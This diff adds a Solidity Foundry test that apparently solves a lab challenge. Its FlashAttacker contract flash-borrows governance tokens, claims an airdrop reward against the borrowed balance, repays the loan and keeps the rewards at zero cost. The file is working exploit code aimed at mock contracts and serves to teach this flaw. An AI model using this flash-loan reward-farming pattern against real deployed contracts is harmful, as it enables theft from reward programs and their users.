@@ -1,0 +1,61 @@
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.24;
+
+import {Test} from "forge-std/Test.sol";
+import {MockERC20} from "../../shared/MockERC20.sol";
+import {FlashLender} from "../src/FlashLender.sol";
+import {Airdrop} from "../src/Airdrop.sol";
+
+/// Borrows a fortune for one call, claims the reward, repays. Net cost: 0.
+contract FlashAttacker {
+    FlashLender public lender;
+    Airdrop public airdrop;
+    MockERC20 public token;
+    MockERC20 public reward;
+
+    constructor(FlashLender _lender, Airdrop _airdrop, MockERC20 _token, MockERC20 _reward) {
+        lender = _lender;
+        airdrop = _airdrop;
+        token = _token;
+        reward = _reward;
+    }
+
+    function attack(uint256 amount) external {
+        lender.flashLoan(amount);
+    }
+
+    function onFlashLoan(uint256 amount) external {
+        airdrop.claim();                         // reward minted against borrowed balance
+        token.transfer(address(lender), amount); // repay
+    }
+
+    function sweep(address to) external {
+        reward.transfer(to, reward.balanceOf(address(this)));
+    }
+}
+
+contract FlashLoanSolution is Test {
+    MockERC20 token;
+    MockERC20 reward;
+    FlashLender lender;
+    Airdrop airdrop;
+    address attacker = makeAddr("attacker");
+    uint256 constant LIQUIDITY = 1_000_000e18;
+
+    function setUp() public {
+        token = new MockERC20("Gov", "GOV");
+        reward = new MockERC20("Reward", "RWD");
+        lender = new FlashLender(token);
+        airdrop = new Airdrop(token, reward);
+        token.mint(address(lender), LIQUIDITY);
+    }
+
+    function test_exploit() public {
+        FlashAttacker a = new FlashAttacker(lender, airdrop, token, reward);
+        a.attack(LIQUIDITY);
+        a.sweep(attacker);
+
+        assertEq(reward.balanceOf(attacker), LIQUIDITY, "attacker should farm rewards for free");
+        assertEq(token.balanceOf(attacker), 0, "attacker spent no capital");
+    }
+}
